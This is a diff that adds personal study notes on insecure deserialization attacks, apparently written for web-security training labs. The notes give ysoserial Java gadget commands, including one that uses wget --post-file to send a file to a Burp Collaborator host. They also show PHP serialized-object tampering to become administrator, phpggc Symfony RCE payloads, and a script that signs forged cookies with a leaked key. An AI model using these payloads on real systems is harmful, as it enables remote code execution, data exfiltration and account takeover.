@@ -1,0 +1,57 @@
+DESERIALIZATION
+aka, weird cookie, but not JWT
+
+try decoding, etc. if it returns some gibberish and text pointing to some serialized object:
+
+This case is Java gadgets (java gibberish):
+
+ java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 
+
+or for exfil:
+
+ java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 'wget --post-file /home/carlos/morale.txt http://burp-collaborator.oastify.com' | gzip -f | base64 -w 0
+
+and URL encode in burp
+
+
+try this payload, pay attention to java version, the CommonsCollections4 component, exchange the command also
+remember about different encodings, B64, URL, etc.
+
+if the --add-opens part doesn't work, make sure it is added to the java command, not ysoserial
+
+
+
+PHP Gadgets:
+this happened with a cookie that was url encoded but had some text,
+upon investigation it turned out to be something like
+token:base64;sig_hmac_sha1:some-key
+
+upon decoding the base64 i was presented with:
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"l2z4z8rtmt3ljjsz0ehcq3lvt4u8raqx";}
+
+modify to:
+O:4:"User":2:{s:8:"username";s:6:"administrator";s:12:"access_token";i:0;}
+
+note the object username changed to administrator, and the last part, s:32, to i: 
+as in the token is changed to zero, but also it's type from string to integer
+
+then, you take this value, and upon input, the PHP error leaks the Framework used, and this is crucial, because now we know what gadget to use, in order to forge the token
+
+next, identify php-info as it leaks the secret_key used for signing the tokens
+
+last step is to download:
+https://github.com/ambionics/phpggc
+
+and use it like so:
+phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
+
+we need to sign the output with below script:
+<?php
+$object = "phpggc-output";
+$secretKey = "phpinfo-leaked-sercret_key";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+?>
+
+the output is our token, which deletes /home/carlos/morale.txt, feel free to use another payload
+
